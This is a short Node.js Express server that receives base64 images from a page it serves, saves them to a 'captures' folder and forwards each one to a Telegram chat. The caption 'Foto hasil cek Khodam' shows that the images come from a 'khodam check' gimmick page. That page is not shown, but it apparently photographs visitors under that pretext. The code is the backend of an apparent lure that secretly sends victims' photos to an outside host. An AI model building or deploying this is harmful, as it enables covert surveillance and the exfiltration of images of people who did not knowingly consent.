
const express = require('express');
const fs = require('fs');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;
const TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
const CHAT_ID = 'YOUR_CHAT_ID';
const bot = new TelegramBot(TOKEN);

app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static('public'));

app.post('/upload', (req, res) => {
  const imgData = req.body.image.replace(/^data:image\/(png|jpeg);base64,/, '');
  const fileName = `captures/${Date.now()}.png`;
  fs.writeFileSync(fileName, imgData, 'base64');
  bot.sendPhoto(CHAT_ID, fileName, { caption: "Foto hasil cek Khodam" });
  res.sendStatus(200);
});

app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
